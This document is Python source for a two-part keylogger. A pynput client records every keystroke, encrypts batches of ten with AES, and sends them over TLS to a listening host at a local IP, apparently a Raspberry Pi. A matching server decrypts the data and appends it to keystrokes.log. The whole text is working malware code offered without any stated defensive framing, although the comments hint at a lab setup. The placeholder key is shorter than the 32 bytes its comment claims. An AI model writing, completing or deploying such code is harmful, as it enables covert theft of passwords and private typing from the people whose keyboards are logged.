import socket
import ssl
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# Configuration
HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 12345
KEY = b'Your32ByteAESEncryptionKey1234'  # Replace with a secure key

# AES Decryption Function
def decrypt_data(encrypted_data):
    iv = encrypted_data[:16]
    ciphertext = encrypted_data[16:]
    cipher = AES.new(KEY, AES.MODE_CBC, iv=iv)
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return plaintext.decode()

# SSL Context Setup
context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.load_cert_chain(certfile='server.crt', keyfile='server.key')

# Create Socket
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.bind((HOST, PORT))
    sock.listen()
    print("Server listening...")
    
    with context.wrap_socket(sock, server_side=True) as ssock:
        conn, addr = ssock.accept()
        print(f"Connected to {addr}")
        
        with conn:
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                try:
                    decrypted = decrypt_data(data)
                    with open('keystrokes.log', 'a') as f:
                        f.write(decrypted)
                    print(f"Logged: {decrypted}")
                except Exception as e:
                    print(f"Decryption error: {e}")

from pynput import keyboard
import socket
import ssl
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

# Configuration
HOST = '192.168.1.100'  # Raspberry Pi's IP
PORT = 12345
KEY = b'Your32ByteAESEncryptionKey1234'  # Same as server

# AES Encryption Function
def encrypt_data(data):
    iv = get_random_bytes(16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv=iv)
    ciphertext = cipher.encrypt(pad(data.encode(), AES.block_size))
    return iv + ciphertext

# SSL Context Setup
context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
context.load_verify_locations(cafile='server.crt')  # Copy server.crt to VM

# Keylogger Callback
buffer = []

def on_press(key):
    try:
        buffer.append(key.char)
    except AttributeError:
        buffer.append(f'[{key.name}]')

    if len(buffer) >= 10:  # Send every 10 keystrokes
        send_data(''.join(buffer))
        buffer.clear()

def send_data(data):
    try:
        encrypted = encrypt_data(data)
        with socket.create_connection((HOST, PORT)) as sock:
            with context.wrap_socket(sock, server_hostname='raspberrypi') as ssock:
                ssock.sendall(encrypted)
    except Exception as e:
        print(f"Connection error: {e}")

# Start Keylogger
with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger started...")
    listener.join()
